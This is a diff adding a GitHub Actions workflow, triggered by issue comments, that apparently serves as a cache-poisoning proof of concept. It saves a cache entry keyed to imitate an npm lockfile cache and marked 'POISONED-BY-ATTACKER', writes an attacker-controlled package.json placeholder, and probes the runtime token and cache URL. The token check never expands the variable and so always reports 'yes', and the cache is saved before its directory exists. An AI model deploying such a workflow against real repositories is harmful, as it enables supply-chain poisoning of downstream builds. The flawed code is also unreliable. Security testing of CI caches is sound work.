@@ -1,0 +1,28 @@
+name: issue_comment cache write test
+on:
+  issue_comment:
+    types: [created]
+permissions:
+  id-token: write
+  contents: read
+  actions: write
+jobs:
+  cache-test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Write poisoned cache entry
+        uses: actions/cache/save@v4
+        with:
+          path: /tmp/poison
+          key: npm-lock-linux-main-POISONED-BY-ATTACKER
+        continue-on-error: true
+      - name: Manual cache write via ACTIONS_RUNTIME_TOKEN
+        run: |
+          echo "RUNTIME_TOKEN available: $([ -n '$ACTIONS_RUNTIME_TOKEN' ] && echo yes || echo no)"
+          echo "CACHE_URL: $ACTIONS_CACHE_URL"
+          # Try to save a cache entry
+          mkdir -p /tmp/poison
+          echo "ATTACKER CONTROLLED DEPENDENCY" > /tmp/poison/package.json
+          echo "Cache content written"
+        env:
+          ACTIONS_RUNTIME_TOKEN: ${{ env.ACTIONS_RUNTIME_TOKEN }}
